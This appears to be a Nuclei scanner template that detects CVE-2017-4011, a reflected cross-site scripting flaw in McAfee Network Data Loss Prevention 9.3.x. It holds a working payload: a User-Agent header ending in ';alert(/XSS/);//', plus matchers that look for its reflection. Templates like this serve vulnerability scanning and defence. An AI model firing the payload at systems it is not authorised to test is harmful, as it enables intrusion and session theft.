id: CVE-2017-4011

info:
  name: McAfee Network Data Loss Prevention 9.3.x - Cross-Site Scripting
  author: geeknik
  severity: medium
  description: McAfee Network Data Loss Prevention User-Agent 9.3.x contains a cross-site scripting vulnerability which allows remote attackers to get session/cookie information via modification of the HTTP request.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to execute arbitrary script code in the context of the targeted user's browser, potentially leading to session hijacking or unauthorized access to sensitive information.
  remediation: |
    Apply the latest security patches or updates provided by McAfee to mitigate the XSS vulnerability.
  reference:
    - https://medium.com/@david.valles/cve-2017-4011-reflected-xss-found-in-mcafee-network-data-loss-prevention-ndlp-9-3-x-cf20451870ab
    - https://kc.mcafee.com/corporate/index?page=content&id=SB10198
    - https://nvd.nist.gov/vuln/detail/CVE-2017-4011
    - http://www.securitytracker.com/id/1038523
    - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2017-4011
    cwe-id: CWE-79
    epss-score: 0.1089
    epss-percentile: 0.93121
    cpe: cpe:2.3:a:mcafee:network_data_loss_prevention:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: mcafee
    product: network_data_loss_prevention
  tags: cve,cve2017,mcafee,xss

http:
  - method: GET
    path:
      - "{{BaseURL}}"

    headers:
      User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1';alert(/XSS/);//

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "var ua='Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1';alert(/XSS/);//"

      - type: word
        part: header
        words:
          - "text/html"
# digest: 4a0a004730450220059ed3f413d004c7405eb9a428d064e5a0852f1447d42581d04af957a87b2211022100f70a31d3c9171d4cfa2053e160e2270a4a61aa46d3c781b691478504e925e69b:922c64590222798bb761d5b6d8e72950